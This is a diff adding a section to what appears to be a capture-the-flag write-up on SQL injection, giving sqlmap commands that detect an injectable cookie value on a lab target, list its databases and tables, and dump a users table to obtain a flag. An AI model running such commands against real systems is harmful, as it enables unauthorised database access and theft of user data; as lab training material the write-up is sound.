@@ -12,3 +12,29 @@
 > sqlmap -u "http://target.com/case2.php" --data="id=1" -D nazwa_bazy -T flag2 --dump
 - and I got a flag :)
 ##  What's the contents of table flag3? (Case #3) 
+- Detect and exploit SQLi vulnerability in Cookie value id=1
+- Vulnerability detection:
+> sqlmap -u "http://target.com/" \
+  --cookie="id=1" \
+  --level=2 \
+  --risk=2 \
+  --batch \
+  --flush-session
+- show databases:
+> sqlmap -u "http://target.com/" \
+  --cookie="id=1" \
+  --level=2 \
+  --dbs \
+  --current-db
+- Exploring the selected database:
+> sqlmap -u "http://target.com/" \
+  --cookie="id=1" \
+  -D nazwa_bazy \
+  --tables
+- Data dump from table:
+> sqlmap -u "http://target.com/" \
+  --cookie="id=1" \
+  -D nazwa_bazy \
+  -T users \
+  --dump
+- got a flag :)
